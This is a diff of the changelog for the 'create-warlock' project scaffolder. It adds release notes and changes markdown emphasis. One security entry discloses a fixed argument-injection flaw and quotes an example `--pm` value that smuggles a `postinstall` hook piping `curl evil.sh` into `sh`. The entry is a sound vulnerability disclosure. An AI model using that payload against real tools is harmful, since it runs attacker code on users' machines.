@@ -6,6 +6,10 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
 ## 5.13.0 - 2026-09-17
 
+### Added
+
+- The optional-feature selector now offers Google sign-in, passkey sign-in, and durable Redis-backed BullMQ queues.
+
 ### Fixed
 
 - A `--db=postgres` scaffold shipped `src/config/database.ts` with an empty `clientOptions: {}`. Cascade's `PostgresPoolConfig` extends `PostgresConnectionConfig`, whose `database` field is required (not optional, unlike Mongo's `MongoClientOptions`), so `{}` failed `tsc --noEmit` on that exact line before a single line of app code ran. `templates/warlock/src/config/database.postgres.ts` now sets `database` inside `clientOptions` too. Verified against a real `npm create warlock@5.12.0 --stack=web --db=postgres --jwt` scaffold installed from the registry: this was the only `tsc` error once devDependencies installed correctly (see below), and it is gone after the fix. Guarded by a new static check in `specs/template-integrity.spec.ts`.
@@ -146,11 +150,11 @@ No changes to `create-warlock`. Released in lockstep with the `@warlock.js/web` 
 ### Fixed
 
 - **The `warlock` binary was never linked in a yarn-1 scaffold.** Installing the batched
-  features under yarn 1 hit an *Invariant Violation* in yarn's linker, which aborted the
+  features under yarn 1 hit an _Invariant Violation_ in yarn's linker, which aborted the
   install before `node_modules/.bin` was written — leaving a scaffolded project whose
   own `warlock` command did not exist. `App.pinViteResolution()` now writes matching
   `resolutions` and `overrides` entries for vite into the generated `package.json`
-  *before* the batched feature install runs, so a single vite version is resolved and
+  _before_ the batched feature install runs, so a single vite version is resolved and
   the linker completes.
 
 ## 5.0.0 - 2026-08-25
@@ -168,7 +172,7 @@ No changes to `create-warlock`. Released in lockstep with the `@warlock.js/web` 
 
 ### Security
 
-- **`--pm` is now validated against an allow-list (`npm`/`yarn`/`pnpm`/`bun`) before it reaches anything.** Previously an arbitrary `--pm` string flowed straight into `spawn()` as the executable to run *and* was spliced verbatim into the generated `package.json`'s script text before that text is parsed as JSON — a crafted value (e.g. `--pm='pnpm","postinstall":"curl${IFS}evil.sh|sh#'`) could inject a `postinstall` script that the scaffolder's own automatic `install()` step would then execute, or invoke an arbitrary binary on `PATH` outright. `--yes`/non-interactive scaffolds now reject any `--pm` outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text).
+- **`--pm` is now validated against an allow-list (`npm`/`yarn`/`pnpm`/`bun`) before it reaches anything.** Previously an arbitrary `--pm` string flowed straight into `spawn()` as the executable to run _and_ was spliced verbatim into the generated `package.json`'s script text before that text is parsed as JSON — a crafted value (e.g. `--pm='pnpm","postinstall":"curl${IFS}evil.sh|sh#'`) could inject a `postinstall` script that the scaffolder's own automatic `install()` step would then execute, or invoke an arbitrary binary on `PATH` outright. `--yes`/non-interactive scaffolds now reject any `--pm` outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text).
 
 ### Dependencies
 
